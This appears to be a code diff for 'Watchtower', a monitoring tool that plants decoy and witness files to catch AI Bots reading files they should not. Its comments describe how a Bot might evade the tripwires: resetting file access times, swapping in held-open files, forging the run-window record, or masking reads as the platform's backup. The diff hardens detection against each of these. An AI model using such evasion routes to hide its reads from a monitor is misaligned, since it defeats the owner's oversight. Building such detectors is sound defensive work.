+        return os.open(sub, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=bfd)
+    finally:
+        os.close(bfd)
+
+
+def arm_witness(reg, folder):
+    """Write a new witness in a decoy folder (its atime set below its mtime) and record it on every decoy there: each time it is
+    armed, never re-armed by name. Fix round 1 (R2): it is written, re-timed and measured through the descriptor that created
+    it, then the name must still point at that same file, so a file a Bot holds open and swaps in meanwhile is never recorded.
+    A failure is silent: the old record is dropped, so there is no proof and reads stay high. Returns True when reg changed."""
+    vs = [v for v in reg.values() if isinstance(v, dict) and os.path.dirname(os.path.expanduser(str(v.get("path", "")))) == folder]
+    for v in vs:
+        v.pop("witness", None)
+    try:
+        dfd = _decoy_dir_fd(folder)
+    except OSError:
+        return bool(vs)
+    try:
+        try:
+            os.unlink(WITNESS, dir_fd=dfd)                # a link put there is removed as a link
+        except FileNotFoundError:
+            pass
+        fd = os.open(WITNESS, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, 0o000, dir_fd=dfd)
+        try:
+            os.write(fd, os.urandom(16))
+            st = os.fstat(fd)
+            os.utime(fd, ns=(st.st_mtime_ns - 86400 * 10 ** 9, st.st_mtime_ns))
+            st = os.fstat(fd)
+        finally:
+            os.close(fd)
+        named = os.stat(WITNESS, dir_fd=dfd, follow_symlinks=False)
+    except OSError:
+        return bool(vs)
+    finally:
+        os.close(dfd)
+    if ((named.st_dev, named.st_ino, named.st_ctime_ns) != (st.st_dev, st.st_ino, st.st_ctime_ns)
+            or not stat.S_ISREG(st.st_mode) or stat.S_IMODE(st.st_mode)):
+        return bool(vs)                                   # something else sits at the name now: no proof
+    for v in vs:
+        v["witness"] = {"ino": st.st_ino, "ctime_ns": st.st_ctime_ns, "atime": st.st_atime}
+    return bool(vs)
+
+
+def _witness(v):
+    """(state, stat) of the witness beside v, both from one lstat. state: 'ok' (armed, unread), 'read' (intact and read since
+    armed), or 'damaged' (missing, replaced, opened up, or its ctime moved); stat is None when damaged."""
+    w = v.get("witness")
+    if not isinstance(w, dict):
+        return "damaged", None
+    try:
+        st = os.lstat(os.path.join(os.path.dirname(os.path.expanduser(v["path"])), WITNESS))
+    except OSError:
+        return "damaged", None
+    if not stat.S_ISREG(st.st_mode) or stat.S_IMODE(st.st_mode) or st.st_ino != w.get("ino") or st.st_ctime_ns != w.get("ctime_ns"):
+        return "damaged", None
+    return ("read" if st.st_atime > w.get("atime", 0) + 1 else "ok"), st
+
+
+def witness_state(v):
+    return _witness(v)[0]
+
+
+def witness_proves(v, t):
+    """The decoy read at t was the platform's backup: the intact witness beside it was read within WITNESS_SLACK seconds of t.
+    Fix round 2 (R2): the read time is the one from the stat that was checked, never a second stat taken after a Bot re-timed it."""
+    state, st = _witness(v)
+    return state == "read" and abs(st.st_atime - t) <= WITNESS_SLACK
+
+
+def remove_witness(folder):
+    w = os.path.join(folder, WITNESS)
+    if owned_path(w, "decoy"):
+        try:
+            os.remove(w)
+        except OSError:
+            pass
+
+
+def reads_recorded(folder):
+    """Does the filesystem under this decoy folder record reads? A probe is written the way a decoy is, read without following a
+    link, then removed. None when it can't be told."""
+    import secrets as _s
+    p = os.path.join(folder, f".probe-{_s.token_hex(3)}")
+    try:
+        before, _, _ = write_decoy(p, "x")
+        fd = os.open(p, os.O_RDONLY | os.O_NOFOLLOW)
+        try:
+            os.read(fd, 1)
+        finally:
+            os.close(fd)
+        return os.lstat(p).st_atime > before + 1
+    except (OSError, DecoyLink):
+        return None
+    finally:
+        if not os.path.islink(folder):
+            try:
+                os.remove(p)
+            except OSError:
+                pass
 
 
 def link_target(p):
@@ -4415,12 +4779,13 @@ def plant_canaries(only=None, token_file=None, refused=None):
         if token_file and name == "cloud-keys":
             content = open(token_file).read()
         try:
-            atime, mtime = write_decoy(p, content)
+            atime, mtime, ident = write_decoy(p, content)
         except DecoyLink as e:
             bad.append(decoy_link_finding(name, p, f"{link_target(p)}. {e}"))
             ledger({"event": "canary-refused", "decoy": name, "path": p, "why": str(e)[:200]})
             continue
-        reg[name] = {"path": p, "token": tok, "atime": atime, "mtime": mtime, "planted": now(), "planted_ts": time.time()}
+        reg[name] = dict({"path": p, "token": tok, "atime": atime, "mtime": mtime, "planted": now(), "planted_ts": time.time()}, **ident)
+        arm_witness(reg, os.path.dirname(p))
         planted.append(name)
     save_json(state_path("canaries.json"), reg)
     if bad:
@@ -4462,6 +4827,7 @@ def tend_canaries(notes):
             os.remove(p)
         except OSError:
             pass
+        remove_witness(os.path.dirname(p))
         try:
             os.rmdir(os.path.dirname(p))
         except OSError:
@@ -4469,7 +4835,7 @@ def tend_canaries(notes):
     if moved:
         decoy_layout(renew=set(moved))                    # new random names, never the published ones again
         plant_canaries(only=set(moved))
-        store = [e for e in load_json(state_path("events.json"), []) if e.get("rule") not in ("WT-K004", "WT-K005")]
+        store = [e for e in load_json(state_path("events.json"), []) if e.get("key") not in BULK_KEYS | {OLD_K005_KEY}]   # calm lines only, never an alarm
         save_json(state_path("events.json"), store)
         if from_old:
             notes.append(f"Moved {len(from_old)} decoys to /var/tmp and /tmp. The platform's file backup read the old ones in /workspace and your home folder "
@@ -4521,20 +4887,13 @@ def cmd_canary(args):
         for f in refused:
             print(f"REFUSED {f['evidence']}. Not written: a link sits where the decoy goes. It is recorded as a high finding.")
         reg = load_json(state_path("canaries.json"), {})
-        probe = state_path("atime-probe")
-        with open(probe, "w") as f:
-            f.write("x")
-        st = os.stat(probe)
-        os.utime(probe, (st.st_mtime - 86400, st.st_mtime))
-        before = os.stat(probe).st_atime
-        with open(probe) as pf:
-            pf.read()
-        reads_tracked = os.stat(probe).st_atime > before + 1
-        os.remove(probe)
+        # batch 2 (R2): read tracking is checked where the decoys are (/tmp and /var/tmp), not in Watchtower's own folder
+        tracked = {d: reads_recorded(d) is True for d in sorted({os.path.dirname(os.path.expanduser(v["path"])) for v in reg.values()})}
         print(f"Planted {len(reg)} canaries: " + ", ".join(v["path"] for v in reg.values()))
-        if not reads_tracked:
-            print("Note: this filesystem doesn't record reads, so canaries will catch deletion and copying, not reading.")
-        ledger({"event": "canary-plant", "count": len(reg)})
+        blind = [d for d, ok in tracked.items() if not ok]
+        if blind:
+            print(f"Note: {', '.join(blind)} {'doesn' if len(blind) == 1 else 'don'}'t record reads, so the decoys there catch deletion and copying, not reading.")
+        ledger({"event": "canary-plant", "count": len(reg), "reads_recorded": tracked})
         return 0
     if args.action == "remove":
         if not getattr(args, "owner_said_yes", False):   # R10: removing the tripwires is the owner's call, never a Bot's
@@ -4550,6 +4909,7 @@ def cmd_canary(args):
                 os.remove(p)
             except OSError:
                 pass
+            remove_witness(os.path.dirname(p))
         save_json(state_path("canaries.json"), {})
         ledger({"event": "canary-remove", "count": len(reg)})
         print("Canaries removed.")
@@ -4561,7 +4921,19 @@ def cmd_canary(args):
     return 0
 
 
-BULK_KEYS = {"WT-K004": "bulk-decoy-read", "WT-K005": "own-scan-decoy-read"}
+BULK_KEY, OLD_K005_KEY = "bulk-decoy-read", "own-scan-decoy-read"
+BULK_KEYS = frozenset((BULK_KEY,))   # batch 2: only the backup's proven sweep is one updated line; every other sweep is its own event
+
+
+def decoy_ident(st):
+    """What a decoy's times can't be set back to by hand: its inode and ctime (utime, chmod, a new file all move one)."""
+    return {"ino": st.st_ino, "ctime_ns": st.st_ctime_ns}
+
+
+def decoy_untouched(v, st):
+    """Fix round 1 (R2): the decoy's times were moved only by a read since Watchtower armed it. A Bot that sets a decoy's atime
+    to match a witness the backup read stamps a new ctime. A registry from before this (no ctime) proves nothing."""
+    return decoy_ident(st) == {"ino": v.get("ino"), "ctime_ns": v.get("ctime_ns")}
 
 
 def decoy_rewritten(v, st):
@@ -4574,11 +4946,12 @@ def decoy_rewritten(v, st):
 
 
 def canary_findings(record=True):
-    """A decoy opened on its own means something went looking: critical. Two or more decoys opened within a couple of
-    minutes means a bulk reader (a Bot grepping every file, a scanner, the platform's file backup): worth knowing,
-    not an alarm. record=False only looks: nothing is reset, saved or logged."""
+    """A decoy opened on its own means something went looking: critical. Batch 2 (R2): two or more decoys read, every read proven
+    by its witness, is the platform's backup: one calm line. Without that proof, reads during a recorded Watchtower run are high
+    (any Bot can write that record), and two or more within a few minutes are high (a Bot grepping every file reads them
+    together too). A single read is never downgraded. record=False only looks: nothing is reset, saved or logged."""
     reg = load_json(state_path("canaries.json"), {})
-    out, reads = [], []
+    out, reads, forged, backup = [], [], set(), False
     for name, v in reg.items():
         p = os.path.expanduser(v["path"])
         if os.path.islink(p) or os.path.islink(os.path.dirname(p)):
@@ -4602,40 +4975,90 @@ def canary_findings(record=True):
             continue
         if st.st_atime > v["atime"] + 1:
             reads.append((name, p, st.st_atime))
-            if record and owned_path(p, "decoy", log=False):
-                os.utime(p, (st.st_mtime - 86400, st.st_mtime), follow_symlinks=False)  # re-arm; a link swapped in since the check is not followed
-                v["atime"] = os.lstat(p).st_atime
+            if not decoy_untouched(v, st):
+                forged.add(name)                          # its times were set by hand, or the registry predates the check
+    # Fix round 1 (R2): every read is judged before anything is re-armed or saved, so a failure never erases the evidence
     if reads:
         when = lambda t: dt.datetime.fromtimestamp(t, dt.timezone.utc).isoformat(timespec="minutes")
         times = [t for _, _, t in reads]
         each = ", ".join(f"{n} {dt.datetime.fromtimestamp(t, dt.timezone.utc).strftime('%H:%M:%S')}" for n, _, t in sorted(reads, key=lambda r: r[2]))
         places = ", ".join(sorted({os.path.dirname(p) for _, p, _ in reads}))
-        runs = load_json(state_path("run_windows.json"), [])
+        runs = run_windows()
         own = lambda t: any(a - 2 <= t <= b + 5 for a, b in runs)
-        if record:
-            for name, _, t in reads:                      # remembered, so a decoy read and then removed is never put back quietly
-                if not own(t):
-                    reg[name]["read_at"] = dt.datetime.fromtimestamp(t, dt.timezone.utc).isoformat(timespec="seconds")
-            save_json(state_path("canaries.json"), reg)
-            ledger({"event": "canary-read", "decoys": [{"name": n, "path": p, "read_at": dt.datetime.fromtimestamp(t, dt.timezone.utc).isoformat(timespec="seconds")} for n, p, t in reads]})
-        if all(own(t) for t in times):
-            out.append(finding("WT-K005", "Decoys read while Watchtower was scanning", "low", ["ASI03"], places,
-                               f"{len(reads)} decoys at {when(min(times))}, during a Watchtower run ({each})",
-                               "Watchtower's own scanners read every file. If you didn't expect a Watchtower run then, tell Watchtower \"incident check\"."))
+        backup = len(reads) >= 2 and not forged and all(witness_proves(reg[n], t) for n, _, t in reads)
+        if backup:
+            f = finding("WT-K004", "Several decoys were read by the platform's backup", "low", ["ASI03"], places,
+                        f"{len(reads)} of {len(reg)} decoys within {int(max(times) - min(times))}s at {when(min(times))} ({each})",
+                        "The file next to each decoy that only a privileged reader can open was read with it: the platform's file backup. "
+                        "It is listed once and updated each time. If it lines up with something you didn't expect, tell Watchtower \"incident check\".")
+            f["key"] = BULK_KEY                           # one line that is updated, not a new finding every time the backup runs
+            out.append(f)
+        elif all(own(t) for t in times):
+            out.append(finding("WT-K005", "Decoys were read while a Watchtower run was recorded", "high", ["ASI03", "ASI10"], places,
+                               f"{len(reads)} decoy(s) at {when(min(times))}, during a recorded Watchtower run ({each})",
+                               "The run record can be written by any Bot, so it doesn't prove the read was Watchtower's, and the backup's proof "
+                               "is missing. Tell Watchtower \"incident check\"."))
         elif len(reads) >= 2 and max(times) - min(times) <= 180:
-            out.append(finding("WT-K004", "Several decoys were read together (a bulk reader)", "low", ["ASI03"], places,
+            out.append(finding("WT-K004", "Several decoys were read together", "high", ["ASI03", "ASI10"], places,
                                f"{len(reads)} of {len(reg)} decoys within {int(max(times) - min(times))}s at {when(min(times))} ({each})",
-                               "Something read many files at once: usually the platform's file backup, or a Bot searching every file. "
-                               "It is listed once and updated each time. If it lines up with something you didn't expect, tell Watchtower \"incident check\"."))
+                               "Something read several decoys at once, and nothing shows it was the platform's backup. A Bot searching every "
+                               "file does this. Tell Watchtower \"incident check\"."))
         else:
             for name, p, t in reads:
                 out.append(finding("WT-K001", "Something opened a decoy file", "critical", ["ASI03", "ASI10"], p, f"{name} read at {when(t)}",
                                    "Nothing legitimate needs this file, and nothing else was searched with it. "
                                    "Find which Bot or routine ran then (Agent Computer view, run history) and tell Watchtower \"incident check\"."))
-    for f in out:
-        if f["rule"] in BULK_KEYS:
-            f["key"] = BULK_KEYS[f["rule"]]   # one line that is updated, not a new finding every time the backup runs
+    if not record:
+        return out
+    if reads:
+        stamp = lambda t: dt.datetime.fromtimestamp(t, dt.timezone.utc).isoformat(timespec="seconds")
+        for name, _, t in reads:                          # remembered, so a decoy read and then removed is never put back quietly
+            if not backup:                                # a run window any Bot can write never hides a read
+                reg[name]["read_at"] = stamp(t)
+        save_json(state_path("canaries.json"), reg)
+        ledger(dict({"event": "canary-read", "decoys": [{"name": n, "path": p, "read_at": stamp(t)} for n, p, t in reads]},
+                    **({"backup": True} if backup else {})))
+        for name, p, _ in reads:                          # only now: the reads are judged and logged
+            v = reg[name]
+            try:
+                st = os.lstat(p)
+                if owned_path(p, "decoy", log=False) and stat.S_ISREG(st.st_mode):
+                    os.utime(p, (st.st_mtime - 86400, st.st_mtime), follow_symlinks=False)  # re-arm; a link swapped in since the check is not followed
+                    st = os.lstat(p)
+                    v["atime"] = st.st_atime
+                    v.update(decoy_ident(st))
+            except OSError:
+                pass
+    if tend_witnesses(reg) or reads:
+        save_json(state_path("canaries.json"), reg)
     return out
+
+
+def run_windows():
+    """The recorded Watchtower runs as (start, end). Any Bot can write this file, so an entry that isn't two numbers in order is
+    dropped (fix round 1, R2): never an error that loses a read, and never a window."""
+    raw = load_json(state_path("run_windows.json"), [])
+    num = lambda x: isinstance(x, (int, float)) and not isinstance(x, bool) and math.isfinite(x)
+    if not isinstance(raw, list):
+        return []
+    return [(r[0], r[1]) for r in raw if isinstance(r, (list, tuple)) and len(r) == 2 and num(r[0]) and num(r[1]) and r[0] <= r[1]]
+
+
+def tend_witnesses(reg, within=None, only_read=False):
+    """After the reads are judged: re-arm each witness that was read, and write a new one where it is missing or damaged (also an
+    install from before the witness). only_read: never write a new one. Only next to a decoy that is there, never through a link."""
+    changed = False
+    for folder in sorted({os.path.dirname(os.path.expanduser(v["path"])) for v in reg.values() if isinstance(v, dict) and v.get("path")}):
+        vs = [v for v in reg.values() if isinstance(v, dict) and os.path.dirname(os.path.expanduser(str(v.get("path", "")))) == folder]
+        if not in_roots(folder, within):
+            continue
+        if os.path.islink(folder) or not any(owned_path(os.path.expanduser(v["path"]), "decoy", log=False)
+                                             and os.path.isfile(os.path.expanduser(v["path"])) for v in vs):
+            continue
+        states = {witness_state(v) for v in vs}
+        if ("damaged" in states and not only_read) or "read" in states:
+            changed |= arm_witness(reg, folder)
+    return changed
 
 
 def cmd_events(args):
@@ -4662,22 +5085,36 @@ def cmd_events(args):
     return 0
 
 
-def rearm_canaries():
+def in_roots(p, within):
+    """True when `within` is None (everywhere) or p is inside one of those folders."""
+    return within is None or _under(os.path.normpath(p), {os.path.normpath(os.path.abspath(os.path.expanduser(r))) for r in within})
+
+
+def rearm_canaries(within=None):
+    """Reset the decoys that were read, and their witnesses. within: only decoys under these folders. The full audit's closing
+    re-arm passes the folders its scanners read (batch 2, R2: it used to reset every decoy and erase a read made meanwhile);
+    the owner-approved fix resets them all."""
     reg = load_json(state_path("canaries.json"), {})
     changed = False
     for v in reg.values():
         p = os.path.expanduser(v["path"])
+        if not in_roots(p, within):
+            continue
         if os.path.islink(p) or os.path.islink(os.path.dirname(p)) or not owned_path(p, "decoy", log=False):
             continue                                      # never touch through a link, or a file that isn't a decoy; the check reports it
         try:
             st = os.lstat(p)
+            if "ctime_ns" in v and not decoy_untouched(v, st):
+                continue                                  # fix round 1 (R2): its times were set by hand; the check reports it, never reset quietly
             if st.st_atime > v.get("atime", 0) + 1:
                 os.utime(p, (st.st_mtime - 86400, st.st_mtime), follow_symlinks=False)
-                v["atime"] = os.lstat(p).st_atime
+                st = os.lstat(p)
+                v["atime"] = st.st_atime
+                v.update(decoy_ident(st))
                 changed = True
         except OSError:
             pass
-    if changed:
+    if tend_witnesses(reg, within, only_read=True) or changed:
         save_json(state_path("canaries.json"), reg)
 
 
@@ -5987,7 +6424,7 @@ def render_brief(b, snap, pkg, hist, tag, analyst_note=None, notes=None):
     lvl_i, lvl, _ = threat_level(b, snap, stories)
     fs = shown((snap or {}).get("findings", []))
     score = (snap or {}).get("score")
-    grade = (snap or {}).get("grade", "")
+    grade = snap_grade(snap)
     todo = needs_you(fs)
     urgent = [t for t in todo if t["severity"] in ("critical", "high")]
     fixed, cleaned = handled_this_week()
@@ -6243,7 +6680,7 @@ PLAIN = {
                 "Ask Watchtower what changed since your last approval; when you're happy, say yes to a fresh start.", "you"),
     "WT-D002": ("Project packages with known security holes", "Attackers know these bugs.", "Tell Watchtower \"fix it\": it updates each project's lockfile and keeps a backup.", "fix"),
     "WT-D001": ("Software with known security holes", "Attackers know these bugs.", "Tell Watchtower \"fix it\": it upgrades them and puts any upgrade back that breaks something.", "fix"),
-    "WT-K005": ("Watchtower's own scan touched the decoys", "Expected when a scan overlaps another run.", "Nothing to do.", "auto"),
+    "WT-K005": ("Decoys were read during a recorded Watchtower run", "Any Bot can write that record, so it proves nothing.", "Tell Watchtower \"incident check\".", "you"),
     "WT-K001": ("Something opened a decoy file", "Nothing normal should touch it.", "Tell Watchtower \"incident check\".", "you"),
     "WT-K003": ("A decoy's contents were copied", "Something read it and wrote it elsewhere.", "Tell Watchtower \"incident check\".", "you"),
     "WT-K006": ("A link was put where a decoy goes", "Writing the decoy would have changed the file it points to.", "Tell Watchtower \"incident check\".", "you"),
@@ -7637,6 +8074,7 @@ def cmd_uninstall(args):
             os.remove(p); n += 1
         except OSError:
             pass
+        remove_witness(os.path.dirname(p))
     save_json(state_path("canaries.json"), {})
     done.append(f"Removed {n} decoy file(s)")
     if refused:
